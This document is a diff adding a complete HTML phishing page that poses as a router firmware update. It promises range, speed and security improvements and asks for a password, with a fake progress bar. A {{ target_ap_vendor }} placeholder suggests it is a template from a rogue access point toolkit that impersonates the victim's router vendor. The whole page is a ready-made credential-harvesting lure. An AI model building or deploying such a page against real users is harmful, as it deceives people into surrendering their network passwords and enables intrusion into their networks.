@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" href="css/style.css" />
+    <link rel="shortcut icon" type="image/png" href="img/favicon.png" />
+
+    <title>Firmware Update</title>
+</head>
+
+<body>
+    <header class="header">
+        <div class="header__text-box">
+            <h1 class="heading-primary">
+                <span class="heading-primary--main">New Update</span>
+                <span class="heading-primary--sub">is now available</span>
+            </h1>
+
+            <a href="#section-update" class="btn btn--white btn--animation">get started »</a>
+        </div>
+    </header>
+    <main>
+        <section class="section-new">
+            <div class="u-center-text u-margin-bottom-big">
+                <h2 class="heading-secondary">
+                    What's new in this update
+                </h2>
+            </div>
+
+            <div class="feature-box">
+                <div class="feature-box__items">
+                    <svg class="feature-box__icon u-margin-bottom-small">
+                        <use xlink:href="img/sprites.svg#icon-connection"></use>
+                    </svg>
+                    <p class="feature-box__text">
+                        This update will extend your wireless range to unprecedented levels. We have
+                        worked very hard to make sure that you can access WIFI
+                        no matter where you go. Now you can access internet in
+                        your basement or even the rooftop.
+                    </p>
+                </div>
+                <div class="feature-box__items">
+                    <svg class="feature-box__icon u-margin-bottom-small">
+                        <use xlink:href="img/sprites.svg#icon-meter"></use>
+                    </svg>
+                    <p class="feature-box__text">
+                        This update will increase your WIFI speeds so you can enjoy it without waiting
+                        for website to load. Say goodbye to slow connections
+                        and experience a new way of connecting to the internet.
+
+                    </p>
+                </div>
+                <div class="feature-box__items">
+                    <svg class="feature-box__icon u-margin-bottom-small">
+                        <use xlink:href="img/sprites.svg#icon-bug"></use>
+                    </svg>
+                    <p class="feature-box__text">
+                        This update will fix many bugs that are currently in the system which will provide
+                        you with a seamless experience. Therefore they router
+                        should no longer crash and stay up and running 99.99%
+                        of the time.
+                    </p>
+                </div>
+                <div class="feature-box__items">
+                    <svg class="feature-box__icon u-margin-bottom-small">
+                        <use xlink:href="img/sprites.svg#icon-shield"></use>
+                    </svg>
+                    <p class="feature-box__text">
+                        Many new security features were added in this update to make sure you and your
+                        family are safe while browsing the internet. One notable
+                        feature is better parental support so you can easily
+                        control what your children do online.
+                    </p>
+                </div>
+            </div>
+
+        </section>
+
+        <section class="section-update" id="section-update">
+            <div class="update u-margin-bottom-huge">
+                <div class="update__form">
+                    <form class="form" onsubmit="return false">
+                        <div class="u-margin-bottom-medium">
+                            <h2 class="heading-secondary">
+                                Start updating now
+                            </h2>
+                        </div>
+
+                        <div class="form__group">
+                            <input type="password" class="form__input" placeholder="Password" id="pass" pattern="[A-Za-z0-9!@#$%^&*-+_=]{8,}"
+                                required />
+                            <label for="pass" class="form__label">Password</label>
+                        </div>
+
+                        <div class="form__group">
+                            <p class="paragraph">
+                                By clicking Next Step you agree to our
+                                <a class="btn-text" href="#">
+                                terms and services.
+                                </a>
+                            </p>
+                        </div>
+
+
+                        <div class="form__group">
+                            <button class="btn btn--green" id="form-button">Next step →</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            <div class="progress">
+                <div class="progress__bar">
+                </div>
+                <div class="progress__text">
+                    <span class="progress__text--main" id="progress__percentage">0%</span>
+                    <span class="progress__text--sub">Completed</span>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer__copyright">
+            <p>
+                Copyright © by {{ target_ap_vendor }}. All rights reserved.
+            </p>
+        </div>
+    </footer>
+
+    <script src="js/script.js"></script>
+</body>
+
+</html>
